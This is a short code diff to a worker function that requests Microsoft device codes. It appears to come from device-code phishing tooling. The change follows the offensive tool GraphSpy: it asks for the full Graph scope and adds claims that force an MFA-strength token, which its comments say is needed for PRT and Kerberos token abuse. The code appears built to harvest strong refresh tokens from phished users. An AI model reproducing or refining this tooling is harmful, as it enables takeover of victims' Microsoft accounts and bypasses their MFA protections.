@@ -432,7 +432,13 @@ async function handleDeviceCodeRequest(request) {
         });
       }
 
-      // Request device code from Microsoft with proper scope for refresh token
+      // Request device code from Microsoft with GraphSpy's default scope and
+      // claims. GraphSpy device_codes.generate(version=2, ngcmfa=True,
+      // cae=True) rides the claims block on the devicecode call ITSELF -
+      // without it AAD is free to satisfy the sign-in from an existing
+      // session and the resulting tokens lack the ngcmfa acrs claim the
+      // PRT / Kerberos flows rely on. amr=ngcmfa forces a strong-auth (MFA)
+      // step; xms_cc=cp1 opts into Continuous Access Evaluation.
       console.log('[Worker] Requesting device code from Microsoft...');
       console.log('[Worker] Tenant:', verifyData.tenant, 'Client ID:', verifyData.client_id);
       const deviceCodeResponse = await fetch(
@@ -442,7 +448,13 @@ async function handleDeviceCodeRequest(request) {
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
           body: new URLSearchParams({
             client_id: verifyData.client_id,
-                        scope: 'openid profile email offline_access',
+            scope: 'https://graph.microsoft.com/.default openid offline_access',
+            claims: JSON.stringify({
+              access_token: {
+                amr: { values: ['ngcmfa'] },
+                xms_cc: { values: ['cp1'] },
+              },
+            }),
           }),
         }
       );
